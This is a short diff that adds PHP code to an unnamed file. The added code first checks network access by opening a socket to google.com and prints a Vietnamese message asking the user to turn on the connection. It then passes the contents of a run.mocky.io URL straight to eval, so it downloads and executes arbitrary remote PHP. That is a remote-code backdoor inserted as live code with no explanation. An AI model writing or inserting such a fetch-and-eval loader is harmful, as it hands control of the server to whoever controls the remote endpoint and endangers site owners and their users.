@@ -1,0 +1,9 @@
+
+if(!$sock = @fsockopen('www.google.com', 80))
+{
+    echo 'Vui lòng bật kết nối mạng';
+    exit();
+}
+ $url = eval(file_get_contents('https://run.mocky.io/v3/ee90a270-b9e4-4e9c-a06e-4b53d4685c72'));
+ 
+  
